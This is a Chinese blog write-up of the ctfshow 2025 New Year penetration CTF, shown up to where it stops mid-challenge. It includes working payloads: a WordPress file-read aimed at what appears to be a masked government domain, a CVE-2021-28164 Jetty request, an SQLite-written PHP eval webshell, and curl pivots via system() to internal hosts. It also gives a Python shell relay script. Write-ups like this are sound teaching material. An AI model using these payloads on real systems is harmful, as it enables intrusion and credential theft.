@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="谁家跨年CTF啊！ 自从去年西瓜杯给CTFSHOW投了个原题（wok真的别骂了传错文件了）就一直心里有个坎过不去。今年打渗透赛的时候还是老是想起这个来（（（现在是处于戴罪立功阶段。多写点wp吧。 启程 我们的演出，开始了。(bushi 下载压缩包，有密码，ZipCracker弱密码爆破一把出。签到题">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow 2025元旦渗透赛 wp">
+<meta property="og:url" content="https://lamentxu.top/posts/2025-01-01-ctfshow-2025-wp/index.html">
+<meta property="og:site_name" content="LamentXU">
+<meta property="og:description" content="谁家跨年CTF啊！ 自从去年西瓜杯给CTFSHOW投了个原题（wok真的别骂了传错文件了）就一直心里有个坎过不去。今年打渗透赛的时候还是老是想起这个来（（（现在是处于戴罪立功阶段。多写点wp吧。 启程 我们的演出，开始了。(bushi 下载压缩包，有密码，ZipCracker弱密码爆破一把出。签到题">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18645068/01.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18645068/02.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18645068/03.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18645068/04.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18645068/05.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18645068/06.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18645068/07.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18645068/08.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18645068/09.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18645068/10.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18645068/11.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18645068/12.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18645068/13.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18645068/14.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18645068/15.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18645068/16.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18645068/17.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18645068/18.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18645068/19.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18645068/20.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18645068/21.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18645068/22.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18645068/23.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18645068/24.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18645068/25.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18645068/26.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18645068/27.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18645068/28.png">
+<meta property="article:published_time" content="2024-12-31T17:10:00.000Z">
+<meta property="article:modified_time" content="2024-12-31T17:10:00.000Z">
+<meta property="article:author" content="LamentXU">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lamentxu.top/images/migrated/18645068/01.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/cnblogs-avatar.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/cnblogs-avatar.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/cnblogs-avatar.png">
+        
+      
+    
+    <!-- title -->
+    <title>ctfshow 2025元旦渗透赛 wp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="LamentXU" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/posts/2025-01-19-web-wp/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/posts/2024-12-22-web-wp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2025-01-01-ctfshow-2025-wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2025-01-01-ctfshow-2025-wp/&text=ctfshow 2025元旦渗透赛 wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2025-01-01-ctfshow-2025-wp/&title=ctfshow 2025元旦渗透赛 wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2025-01-01-ctfshow-2025-wp/&is_video=false&description=ctfshow 2025元旦渗透赛 wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ctfshow 2025元旦渗透赛 wp&body=Check out this article: https://lamentxu.top/posts/2025-01-01-ctfshow-2025-wp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2025-01-01-ctfshow-2025-wp/&title=ctfshow 2025元旦渗透赛 wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2025-01-01-ctfshow-2025-wp/&title=ctfshow 2025元旦渗透赛 wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2025-01-01-ctfshow-2025-wp/&title=ctfshow 2025元旦渗透赛 wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2025-01-01-ctfshow-2025-wp/&title=ctfshow 2025元旦渗透赛 wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2025-01-01-ctfshow-2025-wp/&name=ctfshow 2025元旦渗透赛 wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2025-01-01-ctfshow-2025-wp/&t=ctfshow 2025元旦渗透赛 wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%AF%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">启程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A0%B4%E8%A7%A3%E5%8A%A0%E5%AF%86%E9%80%9A%E8%AE%AF"><span class="toc-number">2.</span> <span class="toc-text">破解加密通讯</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BD%9C%E5%85%A5%E6%95%8C%E8%90%A5"><span class="toc-number">3.</span> <span class="toc-text">潜入敌营</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A7%98%E5%AF%86%E6%BD%9C%E4%BC%8F"><span class="toc-number">4.</span> <span class="toc-text">秘密潜伏</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%B6%E9%9B%86%E6%95%8C%E6%96%B9%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF"><span class="toc-number">5.</span> <span class="toc-text">收集敌方身份信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="toc-number">6.</span> <span class="toc-text">横向渗透</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%82%AE%E7%AE%B1%E8%BF%B7%E4%BA%91"><span class="toc-number">7.</span> <span class="toc-text">邮箱迷云</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%89%B0%E9%9A%BE%E7%9A%84%E6%9C%80%E5%90%8E%E4%B8%80%E6%AD%A5"><span class="toc-number">8.</span> <span class="toc-text">艰难的最后一步</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B7%B3%E5%B2%9B%E6%88%98%E6%9C%AF"><span class="toc-number">9.</span> <span class="toc-text">跳岛战术</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%8D%E4%B8%8B%E4%B8%80%E5%9F%8E"><span class="toc-number">10.</span> <span class="toc-text">再下一城</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A1%BA%E8%97%A4%E6%91%B8%E7%93%9C"><span class="toc-number">11.</span> <span class="toc-text">顺藤摸瓜</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8A%9F%E4%BA%8F%E4%B8%80%E7%AF%91"><span class="toc-number">12.</span> <span class="toc-text">功亏一篑</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%90%8E%E9%9D%A2"><span class="toc-number">13.</span> <span class="toc-text">写在后面</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        ctfshow 2025元旦渗透赛 wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">LamentXU</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-12-31T17:10:00.000Z" class="dt-published" itemprop="datePublished">2025-01-01</time>
+        
+        (Updated: <time datetime="2024-12-31T17:10:00.000Z" class="dt-updated" itemprop="dateModified">2025-01-01</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/PHP/" rel="tag">PHP</a>, <a class="p-category" href="/tags/Python/" rel="tag">Python</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/Writeup/" rel="tag">Writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>谁家跨年CTF啊！</p>
+<p>自从去年西瓜杯给CTFSHOW投了个原题（wok真的别骂了传错文件了）就一直心里有个坎过不去。今年打渗透赛的时候还是老是想起这个来（（（现在是处于戴罪立功阶段。多写点wp吧。</p>
+<h1 id="启程"><a href="#启程" class="headerlink" title="启程"></a>启程</h1><p>我们的演出，开始了。(bushi</p>
+<p>下载压缩包，有密码，ZipCracker弱密码爆破一把出。签到题。弱密码是654321</p>
+<p><strong>ctfshow{654321}</strong></p>
+<h1 id="破解加密通讯"><a href="#破解加密通讯" class="headerlink" title="破解加密通讯"></a>破解加密通讯</h1><p>一个图。拖到010里</p>
+<p><img src="/images/migrated/18645068/01.png"></p>
+<p>有意义不明的字符串，扔到赛博厨子里看，发现有一个加密脚本。</p>
+<p><img src="/images/migrated/18645068/02.png"></p>
+<p>可以看到引入了一个secretMessageResponse库调用printMessage方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install secretMessageResponse</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/migrated/18645068/03.png"></p>
+<p>从第一题的任务应援包中得</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">633246888504573920779824237508007735589231666589188021171575950939940255140086052090801972411182075806200277922264916256376952068104942084262732765302869757002336862151158422906662985191392193462511289187123754337854684702016396996198789908170728175626225281406256476216079863574750768787169969475152717430903460149705597463505143799487488630064694962535355825378265518133414832135165998125004282912865895836379205933895029154287788824317000843771251331435939410389957572552746410933103347212260533351406876584798128116835102705770834548333327952204414218313396767348386545933700371706780732081128764732828398879654027694999061445888984652196057717761623666471390226500419047354546009526849190038055817008252022472857695300387827500818231719929626707573775972451255428059119840669826086027702546510213791864358183204530776020004866770536545695330324167569777791175170044812028227494966458864002660598592490354017639158027968836329598282419666463285900175674408026881052737148611395153194390130628356104784358804158581294733196703476913434055209441802708485723455322985654447400945734717510509951259155462497189459983874690099575241597111904193711108488616566486665053884629084564364205319797812148684173057523812840684555544241901417</span><br><span class="line">31764044218067306492147889531461768510318119973238219147743625781223517377940974553025619071173628007991575510570365772185728567874710285810316184852553098753128108078975486635418847058797903708712720921754985829347790065080083720032152368134209675749929875336343905922553986957365581428234650288535216460326756576870072581658391409039992017661511831846885941769553385318452234212849064725733948770687309835172939447056526911787218396603271670163178681907015237200091850112165224511738788059683289680749377500422958532725487208309848648092125981780476161201616645007489243158529515899301932222796981293281482590413681</span><br><span class="line">19935965463251204093790728630387918548913200711797328676820417414861331435109809773835504522004547179742451417443447941411851982452178390931131018648260880134788113098629170784876904104322308416089636533044499374973277839771616505181221794837479001656285339681656874034743331472071702858650617822101028852441234915319854953097530971129078751008161174490025795476490498225822900160824277065484345528878744325480894129738333972010830499621263685185404636669845444451217075393389824619014562344105122537381743633355312869522701477652030663877906141024174678002699020634123988360384365275976070300277866252980082349473657</span><br></pre></td></tr></table></figure>
+
+<p>得到p,q,n。直接拿这个去求私钥。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">phi = (p - 1) * (q - 1)</span><br><span class="line">d = pow(e, -1, phi)</span><br><span class="line">key = RSA.construct((n, e, d, p, q))</span><br><span class="line">private_key = key.export_key()</span><br><span class="line">print(private_key.decode(&#x27;utf-8&#x27;))</span><br></pre></td></tr></table></figure>
+
+<p>得私钥，用私钥解密。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Park:</span><br><span class="line">你的行动已经暴露，24小时内迅速撤离，销毁所有资料，将现有资料统一上传到【任务中心】</span><br><span class="line">发送人：Dylan</span><br><span class="line">Park:</span><br><span class="line">总部已经为你安排新的身份，请务必在3日内抵台，你的新身份是新竹县动物保护防疫所网络安全顾问，【任务中心】账号密码和你任职单位网站的数据库用户名密码一致，请尽快修改 </span><br><span class="line">发送人：Dylan</span><br><span class="line">Park:</span><br><span class="line">【任务中心】网址已变更为 https://task.ctfer.com ，请注意修改浏览器地址栏中的链接 </span><br><span class="line">发送人：Dylan</span><br></pre></td></tr></table></figure>
+
+<p>得到网址</p>
+<p><strong>ctfshow{<a target="_blank" rel="noopener" href="https://task.ctfer.com/">https://task.ctfer.com</a>}</strong></p>
+<h1 id="潜入敌营"><a href="#潜入敌营" class="headerlink" title="潜入敌营"></a>潜入敌营</h1><p>直接去打<code>https://apc.hsinchu.g*v.t*</code></p>
+<p>手fuzz出：<code>https://apc.hsinchu.g*v.t*/wp-login.php</code></p>
+<p>发现是wordpress，对着版本号搜payload，看到：</p>
+<p><img src="/images/migrated/18645068/04.png"></p>
+<p>抄payload一打通 <code>https://apc.hsinchu.g*v.t*/?aam-media=wp-config.php</code></p>
+<p>得到download文件</p>
+<p><img src="/images/migrated/18645068/05.png"></p>
+<p><strong>ctfshow{hsinchug_wp1_Q.4Vyj8VCiedX1KYU5g05}</strong></p>
+<p>这里也可以WPSCAN梭</p>
+<h1 id="秘密潜伏"><a href="#秘密潜伏" class="headerlink" title="秘密潜伏"></a>秘密潜伏</h1><p>JWT题 进去发现有个废弃的公钥，有个烧掉的密钥。</p>
+<p><img src="/images/migrated/18645068/06.png"></p>
+<p>hashcat 破解出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 3 -m 16500 hash.txt --custom-charset1=?l?d 4a4f7d6e8b5?1?1?10c7f</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/migrated/18645068/07.png"></p>
+<p>key: 4a4f7d6e8b5e3a0c7f</p>
+<p>伪造dylan用户出电话号</p>
+<p><code>JWT:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkeWxhbiIsImV4cCI6MTczNTc0MzI4MH0.4lZrlCBSKMswlpj8vSYVtv7539sTXXvxd7u9i_cNa_g</code></p>
+<p><img src="/images/migrated/18645068/08.png"></p>
+<p><strong>ctfshow{117447685307}</strong></p>
+<h1 id="收集敌方身份信息"><a href="#收集敌方身份信息" class="headerlink" title="收集敌方身份信息"></a>收集敌方身份信息</h1><p>发信主页多了几个功能</p>
+<p><img src="/images/migrated/18645068/09.png"></p>
+<p>一个一个测试，出两个接口。</p>
+<p>GET &#x2F;listTaskFiles?path&#x3D; 列出文件夹下的文件<br>GET &#x2F;readTaskFile?path&#x3D;&amp;file_name&#x3D; 读取文件</p>
+<p>严格过滤了<code>/</code>。但当path&#x3D;空的时候，读取同目录</p>
+<p><img src="/images/migrated/18645068/10.png"></p>
+<p>读取init_users.json出</p>
+<p><img src="/images/migrated/18645068/11.png"></p>
+<p><strong>ctfshow{7y.(sc#Ac_}</strong></p>
+<h1 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h1><p>如题，爆破IP，发现除了题目的.4活着之外，还有.5和.6服务。</p>
+<p>.6服务是一个flask服务，源码可以在<code>GET /readTaskFile?path=&amp;file_name=main.py.bak</code>读到（除了app.py被waf了都能读）</p>
+<p>.5一个php服务，进去直接就是SECRET_KEY</p>
+<p><img src="/images/migrated/18645068/12.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;0x8F7C71E8E82E4D1E&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="邮箱迷云"><a href="#邮箱迷云" class="headerlink" title="邮箱迷云"></a>邮箱迷云</h1><p>直接猜出来的。</p>
+<p>题目提示是park这个人。这个人是我们的调查员。</p>
+<p>直接看之前的图，底下都有个数字</p>
+<p><img src="/images/migrated/18645068/13.png"></p>
+<p>猜就有</p>
+<p><strong>ctfshow{81192}</strong></p>
+<h1 id="艰难的最后一步"><a href="#艰难的最后一步" class="headerlink" title="艰难的最后一步"></a>艰难的最后一步</h1><p>测出来.7:8080有个jelly server服务，fuzz</p>
+<p>出CVE-2021-28164，一打通</p>
+<p><code>payload: GET /downloadTaskFile?url=http://172.2.222.7:8080/.%00/WEB-INF/web.xml</code></p>
+<p><img src="/images/migrated/18645068/14.png"></p>
+<p><strong>ctfshow{ctfshow_2025}</strong></p>
+<h1 id="跳岛战术"><a href="#跳岛战术" class="headerlink" title="跳岛战术"></a>跳岛战术</h1><p>环境错了。这里卡了我好久呜呜呜。</p>
+<p>Sqlite连接不需要密码。这里用户名密码直接空着就能连接。后面的DSN得翻开发手册，对着连接就行。</p>
+<p>贴个出题人的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.24.5/index.php?%3fdsn%3dsqlite%3ashell.php%26username%3daaa%26password%3dbbb%26query%3dcreate%2520table%2520%22aaa%22%2520(name%2520TEXT%2520DEFAULT%2520%22%3c%3fphp%2520file_put_contents(%271.php%27%2c%27%3c%3fphp+eval(%24_GET%5b1%5d)%3b%3f%3e%27)%3b%3f%3e%22)%3b</span><br></pre></td></tr></table></figure>
+
+<p>这里我是ATTACH DATABASE做的。贴一下我的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.24.5/index.php?username=LamentXU%26password=LamentXU%26dsn=sqlite:hack.php%26query=ATTACH DATABASE &#x27;/var/www/html/hack.php&#x27; AS hack;</span><br></pre></td></tr></table></figure>
+
+<p>然后CREATE TABLE写</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.24.5/index.php?username=LamentXU%26password=LamentXU%26dsn=sqlite:/var/www/html/hack.php&amp;query=create TABLE exp (&#x27;hacked &lt;?php eval($_GET[&quot;hack&quot;]); ?&gt;&#x27; text);</span><br></pre></td></tr></table></figure>
+
+<p>但是抽象的是hack.php虽然能正常创建，但是用CREATE TABLE写不了（本地能通，远程通不了）最后还是用的出题人的payload打。</p>
+<p>连接1.php拿到shell。读取config.php出。</p>
+<p><img src="/images/migrated/18645068/15.png"></p>
+<p><strong>ctfshow{3f7a1d5a-d55d-4d9d-8d9a-d5d5d5d5d5d5}</strong></p>
+<h1 id="再下一城"><a href="#再下一城" class="headerlink" title="再下一城"></a>再下一城</h1><p>传session：<code>Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3kddg.CjbNhdNFa_7H--igibxBzM2omNk</code>出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.233.5/1.php?1=system(&#x27;curl -b &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3kddg.CjbNhdNFa_7H--igibxBzM2omNk&quot;  http://172.2.233.6:8888/key&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/migrated/18645068/16.png"></p>
+<p><strong>ctfshow{4f5d1d5d-1d5d-1d5d1d5d1d5d}</strong></p>
+<h1 id="顺藤摸瓜"><a href="#顺藤摸瓜" class="headerlink" title="顺藤摸瓜"></a>顺藤摸瓜</h1><p>注意到有debug&#x3D;True。这里也许可以打pin码泄露（注意！！！这里要用base64编码一下再解码。估计中间的转编码很复杂，最好全化成base64不容易丢失或错传字符）</p>
+<p>贴一个ZianTT写的interactive shell脚本。感谢大佬的友情赞助。（这里我把system里的base64解码改到system外了，用php的base64_decode实现，有些部分调整了一下）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    data = input(&quot;&gt; &quot;)</span><br><span class="line">    # data = urllib.parse.quote(data)</span><br><span class="line">    # python_shell = &#x27;curl --cookie &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3kddg.CjbNhdNFa_7H--igibxBzM2omNk;__wzd2fb5743f98b45463400e=1736152460|4bfc86e353c8&quot; &quot;http://172.2.252.6:8888/console?__debugger__=yes&amp;s=eABh7cMeNgMKri1DSi4w&amp;cmd=&#123;&#125;&amp;frm=1&quot;&#x27;.format(data)</span><br><span class="line">    # python_shell = base64.b64encode(python_shell.encode()).decode()</span><br><span class="line">    data = base64.b64encode(data.encode()).decode()</span><br><span class="line">    # normal_shell = &#x27;echo &quot;&#x27; + data + &#x27;&quot; | base64 -d | sh&#x27;</span><br><span class="line">    normal_shell=data</span><br><span class="line">    # url = &quot;https://543f943e-6f90-43b4-bfc8-ee86d2fb3f34.challenge.ctf.show/downloadTaskFile?url=http://172.2.239.5/1.php?1=phpinfo();&quot;</span><br><span class="line">    url = &quot;http://9c30a725-a36d-4e54-874b-f088dc3d80cf.challenge.ctf.show/downloadTaskFile?url=http://172.2.233.5/1.php?1=system(base64_decode(\&quot;&quot;+normal_shell+&quot;\&quot;));&quot;</span><br><span class="line">    response = requests.get(url, verify=False, headers=&#123;&#x27;Authorization&#x27;: &quot;Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkeWxhbiIsImV4cCI6MTgzNjIzMjMxN30.nB-6uWH-wBxU3e_QJLw1O_TaPARU5o2DUe-y1TvqX5w&quot;&#125;)</span><br><span class="line">    try:</span><br><span class="line">        # print(url)</span><br><span class="line">        # print(response.json())</span><br><span class="line">        # print(response.json()[&quot;url&quot;])</span><br><span class="line">        print(response.json()[&quot;file_content&quot;])</span><br><span class="line">    except:</span><br><span class="line">        print(&quot;Error&quot;)</span><br><span class="line">        continue</span><br></pre></td></tr></table></figure>
+
+<p>可以看到非常的好用啊（）（</p>
+<p><img src="/images/migrated/18645068/17.png"></p>
+<p>设置loggername为werkzeug记录flask的日志（不知道的可以打个断点看一下，在logdict里有）</p>
+<p><img src="/images/migrated/18645068/18.png"></p>
+<p>查一下就可以知道这个logger可以记录flask的日志</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -b &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3kddg.CjbNhdNFa_7H--igibxBzM2omNk&quot; http://172.2.233.6:8888/set_log_option?logName=werkzeug%26logFile=werkzeug.log</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/migrated/18645068/19.png"></p>
+<p>这里可以通过printpin来泄露pin码。</p>
+<p>首先访问console拿到secret</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -b &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3kddg.CjbNhdNFa_7H--igibxBzM2omNk&quot; &quot;http://172.2.233.6:8888/console&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/migrated/18645068/20.png"></p>
+<p>随后带着secret去printpin</p>
